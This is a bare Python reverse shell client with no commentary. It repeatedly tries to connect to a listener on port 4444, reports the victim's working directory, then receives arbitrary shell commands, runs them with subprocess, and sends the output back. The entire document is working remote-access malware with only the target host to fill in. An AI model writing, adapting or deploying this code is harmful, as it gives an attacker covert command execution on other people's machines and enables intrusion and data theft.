import socket, os, sys, subprocess
from time import sleep
sHost = "localhost"
sPort = 4444
bufferSize = 1024 * 128
separator = " "
isntConnected = True
s = socket.socket()
while isntConnected:
    try:
        s.connect((sHost, sPort))
        isntConnected = False
    except:
        continue
    sleep(5)




currentWorkingDirectory = os.getcwd()

s.send(currentWorkingDirectory.encode())

while True:
    cmd = s.recv(bufferSize).decode()
    splited_command = cmd.split()
    if cmd.lower() == "exit":
        break
    if splited_command[0].lower() == "cd":

        try:
            os.chdir(''.join(splited_command[1:]))
        except FileNotFoundError as e:
            output = str(e)
        else:
            output = ""
    else:
        output = subprocess.getoutput(cmd)

    currentWorkingDirectory = os.getcwd()
    message = f'{output}{separator}{currentWorkingDirectory}'
    s.send(message.encode())
s.close()